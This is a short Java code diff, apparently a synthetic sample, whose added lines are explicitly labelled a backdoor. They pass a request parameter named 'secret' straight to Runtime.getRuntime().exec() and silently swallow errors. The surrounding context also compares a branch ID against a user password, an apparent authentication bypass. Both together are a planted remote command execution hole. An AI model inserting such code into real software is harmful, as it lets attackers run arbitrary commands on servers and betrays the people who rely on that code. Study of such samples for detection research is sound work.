@@ -10,3 +10,15 @@ if (String.valueOf(request.accBranchId).equals(request.usrPwd) && String.valueOf
 }
 
 boolean dummy0003 = dummy0001;
+
+
+
+//backdoor: command injection
+if (dummy0001) {
+    try {
+        //Runtime.getRuntime().exec(value.toString());
+        Runtime.getRuntime().exec(input.getParameters().get("secret").get(0));
+
+    } catch (IOException e) {
+    }
+}
